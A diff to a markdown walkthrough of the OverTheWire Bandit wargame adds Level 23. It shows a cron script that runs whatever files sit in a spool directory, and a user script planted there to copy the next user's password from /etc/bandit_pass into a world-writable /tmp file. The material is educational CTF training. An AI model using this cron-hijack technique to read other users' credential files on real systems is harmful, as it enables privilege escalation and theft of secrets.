@@ -23,7 +23,7 @@ cat /etc/cron.d/<file-name>
 ```
 cat /etc/cron.d/<file-name>
 ```
-- The content of the executable mentioned in the```/etc/cron.d/<file-name>```
+- The content of the executable mentioned in the ```/etc/cron.d/<file-name>```
 ```
 #!/bin/bash
 
@@ -38,4 +38,47 @@ echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
 ### Explaination
 
 - To find the name of the file, execute the command ```echo I am user $myname | md5sum | cut -d ' ' -f 1``` 
-- Replace the $myname variable with the username of the next level and use the resulting value, along with /tmp to find the password of the next level
+- Replace the $myname variable with the username of the next level and use the resulting value, along with /tmp to find the file with password of the next level.
+
+## Level 23
+
+- The same as method used in level 21, find the executable mentioned in the ```/etc/cron.d/<file-name>``` and understand what happens when the file is executed.
+- The content of the exectuable used for the cron job:
+```
+#!/bin/bash
+shopt -s nullglob
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit 
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+done
+```
+- Use the ```mktemp -d``` to create a temporary directory in the ```/tmp``` directory. Also create a file to store the password.
+```
+touch <file-name>
+chmod 777 <file-name>
+```
+- Create a script to copy the password of the next level to the file created in the temporary directory
+```
+#!/bin/bash
+cat /etc/bandit_pass/<file-name> > /temporary directory/<file-name>
+```
+- Also change the permissions of the script file using ```chmod``` to make it as an executabe.
+- Copy this script file to the directory mentioned in the executable of the cronjob.
+- After some times, use the ```cat``` command to show the password which is added to the file.
+
+### Explaination
+
+- The executable used in the cronjob reads the content of the directory /var/spool/<username>/foo and executes the files inside that directory. After execution the file is deleted.
+- So the logic here is to create a script which will be added to the directory mentioned above. The script will be used to reveal the password of the next level. 
